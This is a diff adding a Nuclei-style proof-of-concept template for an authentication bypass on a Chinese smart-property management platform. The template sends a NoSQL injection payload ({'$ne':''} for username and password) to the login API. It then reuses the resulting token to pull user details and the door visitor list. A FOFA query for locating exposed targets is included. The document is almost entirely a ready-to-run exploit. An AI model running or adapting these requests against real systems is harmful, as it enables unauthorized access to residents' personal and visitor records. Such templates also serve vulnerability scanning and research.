@@ -1,0 +1,48 @@
+id: poc-huckcvfykro5giia
+info:
+  name: 青岛住云创智科技有限公司智慧物业服务平台login存在身份认证绕过漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/huckcvfykro5giia'
+  tags: unauth,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: huckcvfykro5giia
+    fofa: title="智慧物业"
+http:
+- raw:
+  - 'POST /api/login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+
+    {"username":{"$ne":""},"password":{"$ne":""}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /api/user HTTP/1.1
+
+    Host: {{Hostname}}
+
+    token:第一个请求的token填入'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /api/door/visitor/list HTTP/1.1
+
+    Host: {{Hostname}}
+
+    token:第一个请求的token填入'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
